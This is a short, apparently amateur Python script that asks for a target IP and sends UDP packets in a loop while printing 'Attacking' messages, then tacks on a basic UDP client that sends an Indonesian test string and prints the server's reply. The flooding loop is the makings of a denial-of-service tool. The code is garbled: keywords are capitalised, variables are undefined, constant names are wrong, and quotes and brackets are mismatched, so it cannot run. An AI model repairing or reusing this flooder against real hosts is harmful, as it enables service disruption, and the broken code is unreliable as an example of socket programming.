import socket

ip = str(input('[+] Target: '))

Target_host = "127.0.0.0"
Target_port = 9999

While True:
        Try:
            s = socket.socket(socket.AF_INET, socket.SOCKET_DGRAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            x += 1
            print (Attacking  '+ip' | Sent '+str(xx))

client = socket.socket(socket.AF_INET, socket.SOCKET,DGRAM) #UDP

client.sendto("Tes Aja Kok"),(target_host, target_port))

data, addr = client.recvfrom(4096)

print ("Pesan Dari Server : \*()\**,format.(data.decode))))

client.close